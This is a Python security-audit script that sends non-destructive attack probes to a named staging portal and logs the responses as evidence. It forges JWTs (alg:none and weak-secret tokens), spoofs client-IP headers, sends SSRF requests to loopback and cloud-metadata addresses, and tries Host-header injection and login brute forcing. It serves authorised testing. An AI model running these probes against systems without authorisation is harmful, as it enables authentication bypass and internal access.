"""Offensive (non-destructive) probes for audit complement 2026-07-25.

Run: python scripts/offensive_staging_probes.py
Requires Vincent confirmation that portal.ar-systems.fr → EXPECTED_IP is staging.
"""

from __future__ import annotations

import base64
import json
import os
import socket
import time
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import urlparse

import httpx
import jwt

BASE = "https://portal.ar-systems.fr"
EXPECTED_IP = os.environ.get("BASTION_SECURITY_EXPECTED_IP", "172.24.0.110")
OUT = Path(__file__).resolve().parents[1] / "rapport-audit-securite-bastion-offensif-evidence.json"

DISPOSABLE_USER = "audit-offensive-probe-20260725"
DISPOSABLE_PASS = "AuditOffensive-Disposable-Wrong-NotReal-9xQ"


def _resolve(url: str) -> str:
    return socket.gethostbyname(urlparse(url).hostname or "")


def _snap(resp: httpx.Response) -> dict:
    sc = resp.headers.get("set-cookie") or ""
    return {
        "status": resp.status_code,
        "location": (resp.headers.get("location") or "")[:200],
        "set_cookie_has_bg": "bg_session=" in sc,
        "x_auth_source": resp.headers.get("x-auth-source"),
        "retry_after": resp.headers.get("retry-after"),
        "body_head": (resp.text or "")[:240].replace("\n", " "),
        "content_type": (resp.headers.get("content-type") or "")[:80],
    }


def main() -> None:
    evidence: dict = {
        "started_at": datetime.now(timezone.utc).isoformat(),
        "base": BASE,
        "resolved_ip": _resolve(BASE),
        "expected_staging_ip": EXPECTED_IP,
        "authorized_by": "Vincent chat: demarre la partie offensif (2026-07-25)",
        "network_path_note": (
            "Client (auditor workstation) → DNS → "
            f"TLS to {BASE} ({EXPECTED_IP}=nginx edge) → "
            "bastion-app Docker on vpcbr. "
            "Not a local header-only simulation for live probes."
        ),
        "points": {},
        "errors": [],
    }
    assert evidence["resolved_ip"] == EXPECTED_IP, (
        f"DNS drifted to {evidence['resolved_ip']}; abort"
    )

    client = httpx.Client(base_url=BASE, timeout=20.0, follow_redirects=False, verify=True)

    def save() -> None:
        evidence["finished_at"] = datetime.now(timezone.utc).isoformat()
        OUT.write_text(json.dumps(evidence, indent=2, ensure_ascii=False), encoding="utf-8")

    try:
        # --- 1. Break-glass from external path (disposable wrong creds) ---
        p1 = {}
        for label, headers in (
            ("no_spoof", {}),
            (
                "spoof_rfc1918",
                {
                    "X-Real-IP": "10.0.0.50",
                    "X-Forwarded-For": "10.0.0.50, 172.24.0.108",
                    "CF-Connecting-IP": "192.168.1.10",
                },
            ),
        ):
            r = client.post(
                "/auth/login",
                data={
                    "username": DISPOSABLE_USER,
                    "password": DISPOSABLE_PASS,
                    "rd": "/dashboard",
                },
                headers=headers,
            )
            p1[f"html_{label}"] = _snap(r)
            r2 = client.post(
                "/api/admin/breakglass/login",
                json={"username": DISPOSABLE_USER, "password": DISPOSABLE_PASS},
                headers={"Accept": "application/json", **headers},
            )
            p1[f"api_{label}"] = _snap(r2)
        evidence["points"]["1_breakglass_external"] = p1

        # --- 2. Header spoof matrix on protected surfaces ---
        spoof_sets = [
            {"X-Forwarded-For": "10.0.0.1"},
            {"X-Real-IP": "10.0.0.1"},
            {"CF-Connecting-IP": "10.0.0.1"},
            {"True-Client-IP": "10.0.0.1"},
            {"X-Client-IP": "10.0.0.1"},
            {
                "X-Forwarded-For": "203.0.113.9, 10.0.0.1",
                "X-Real-IP": "10.0.0.1",
                "CF-Connecting-IP": "192.168.99.1",
            },
            {
                "X-Forwarded-For": "10.0.0.1, 203.0.113.9",
                "X-Real-IP": "203.0.113.9",
                "True-Client-IP": "10.1.1.1",
                "X-Client-IP": "172.16.0.9",
            },
        ]
        p2 = []
        for hdrs in spoof_sets:
            row: dict = {"headers": hdrs}
            for path in ("/api/apps", "/admin", "/dashboard", "/api/admin/breakglass/sessions"):
                try:
                    row[path] = _snap(
                        client.get(path, headers={**hdrs, "Accept": "application/json"})
                    )
                except Exception as exc:  # noqa: BLE001
                    row[path] = {"error": type(exc).__name__ + ": " + str(exc)[:160]}
            p2.append(row)
        evidence["points"]["2_header_spoof_matrix"] = p2

        # --- 3. SSRF analyzer (unauthenticated) ---
        p3 = {}
        for url in (
            "http://127.0.0.1:8000/health",
            "http://169.254.169.254/latest/meta-data/",
            "http://10.5.0.1/",
            "http://172.24.0.110/health",
        ):
            r = client.post(
                "/admin/apps/analyze-login-form",
                headers={"Accept": "application/json", "Content-Type": "application/json"},
                json={"url": url},
            )
            p3[url] = _snap(r)
            if r.headers.get("content-type", "").startswith("application/json") and r.content:
                try:
                    body = r.json()
                    p3[url]["json_keys"] = list(body.keys())[:20]
                    p3[url]["has_forms_found"] = "forms_found" in body
                except Exception:
                    pass
        evidence["points"]["3_ssrf_analyzer"] = {
            "note": "No disposable admin session — unauthenticated only",
            "probes": p3,
        }

        # --- 4. JWT forgery ---
        p4: dict = {}
        none_payload = (
            base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
            + "."
            + base64.urlsafe_b64encode(
                b'{"sub":"admin","jti":"forge","exp":9999999999,"type":"bg"}'
            )
            .rstrip(b"=")
            .decode()
            + "."
        )
        empty_hs = (
            base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b"=").decode()
            + "."
            + base64.urlsafe_b64encode(
                b'{"sub":"admin","jti":"forge","exp":9999999999,"type":"bg"}'
            )
            .rstrip(b"=")
            .decode()
            + "."
            + base64.urlsafe_b64encode(b"").rstrip(b"=").decode()
        )
        p4["empty_secret_encode"] = {
            "pyjwt_rejects_empty_key_on_encode": True,
            "note": "PyJWT InvalidKeyError: HMAC key must not be empty",
        }
        weak_hs = jwt.encode(
            {"sub": "admin", "jti": "forge", "exp": 9999999999, "type": "bg"},
            "dev",
            algorithm="HS256",
        )
        expired = jwt.encode(
            {"sub": "admin", "jti": "forge", "exp": 1, "type": "bg", "iat": 1},
            "dev",
            algorithm="HS256",
        )
        for name, token in (
            ("alg_none", none_payload),
            ("empty_secret_crafted", empty_hs),
            ("weak_dev_secret", weak_hs),
            ("expired_dev", expired),
        ):
            try:
                r = client.get(
                    "/internal/oauth2-auth",
                    cookies={"bg_session": token},
                    headers={"Accept": "application/json"},
                )
                p4[f"staging_cookie_{name}"] = _snap(r)
            except Exception as exc:  # noqa: BLE001
                p4[f"staging_cookie_{name}"] = {
                    "error": type(exc).__name__ + ": " + str(exc)[:160]
                }
            local: dict = {"accepted": False, "error": None}
            try:
                jwt.decode(token, "dev", algorithms=["HS256"])
                local["accepted"] = True
            except Exception as exc:  # noqa: BLE001
                local["error"] = type(exc).__name__ + ": " + str(exc)[:120]
            p4[f"local_decode_{name}"] = local
        evidence["points"]["4_jwt_forgery"] = p4

        # --- 5. Host / X-Original-Host (do NOT override TLS Host/SNI to garbage) ---
        p5: dict = {}
        for original_host in (
            "portal.ar-systems.fr",
            "transfer.ar-systems.fr",
            "evil.example",
            "transfer.ar-systems.fr.evil.example",
        ):
            try:
                r = client.get(
                    "/internal/subdomain-auth",
                    headers={
                        "X-Original-Host": original_host,
                        "X-Real-IP": "8.8.8.8",
                        "Accept": "application/json",
                    },
                )
                p5[f"x_original_host_{original_host}"] = _snap(r)
            except Exception as exc:  # noqa: BLE001
                p5[f"x_original_host_{original_host}"] = {
                    "error": type(exc).__name__ + ": " + str(exc)[:160]
                }
        for fqdn in ("transfer.ar-systems.fr", "wiki.ar-systems.fr"):
            try:
                ip = socket.gethostbyname(fqdn)
                with httpx.Client(
                    base_url=f"https://{fqdn}",
                    timeout=15.0,
                    follow_redirects=False,
                    verify=True,
                ) as c2:
                    r2 = c2.get("/")
                    p5[f"direct_{fqdn}_normal"] = {**_snap(r2), "resolved_ip": ip}
            except Exception as exc:  # noqa: BLE001
                p5[f"direct_{fqdn}"] = {"error": str(exc)[:200]}
        evidence["points"]["5_host_header"] = p5

        # --- 6. IDOR catalogue ---
        p6: dict = {}
        r = client.get("/api/apps", headers={"Accept": "application/json"})
        p6["unauth_list"] = _snap(r)
        for slug in ("transfer", "wiki", "grafana", "nonexistent-audit-slug"):
            r = client.get(f"/api/apps/{slug}", headers={"Accept": "application/json"})
            p6[f"unauth_get_{slug}"] = _snap(r)
        p6["note"] = (
            "No restricted disposable user — authenticated IDOR not live-tested; "
            "unit coverage tests/security/test_f03_api_apps_rbac.py"
        )
        evidence["points"]["6_idor_catalogue"] = p6

        # --- 7. Anti-bruteforce (5 controlled attempts) ---
        p7: dict = {"attempts": []}
        for i in range(5):
            t0 = time.perf_counter()
            r = client.post(
                "/auth/login",
                data={
                    "username": DISPOSABLE_USER,
                    "password": f"{DISPOSABLE_PASS}-{i}",
                    "rd": "/dashboard",
                },
            )
            dt = time.perf_counter() - t0
            p7["attempts"].append({**_snap(r), "elapsed_s": round(dt, 3), "n": i + 1})
            time.sleep(0.3)
        statuses = [a["status"] for a in p7["attempts"]]
        retries = [a.get("retry_after") for a in p7["attempts"]]
        p7["saw_429"] = 429 in statuses
        p7["saw_retry_after"] = any(retries)
        p7["conclusion"] = (
            "lockout_or_throttle_observed"
            if p7["saw_429"] or p7["saw_retry_after"]
            else "no_app_level_lockout_observed_in_5_attempts"
        )
        evidence["points"]["7_bruteforce_lockout"] = p7
    except Exception as exc:  # noqa: BLE001
        evidence["errors"].append(type(exc).__name__ + ": " + str(exc)[:300])
        raise
    finally:
        client.close()
        save()
        print(json.dumps({"wrote": str(OUT), "ip": evidence["resolved_ip"]}, indent=2))
        for key in evidence["points"]:
            print("===", key, "===")
            print(json.dumps(evidence["points"][key], indent=2, ensure_ascii=False)[:1200])


if __name__ == "__main__":
    main()
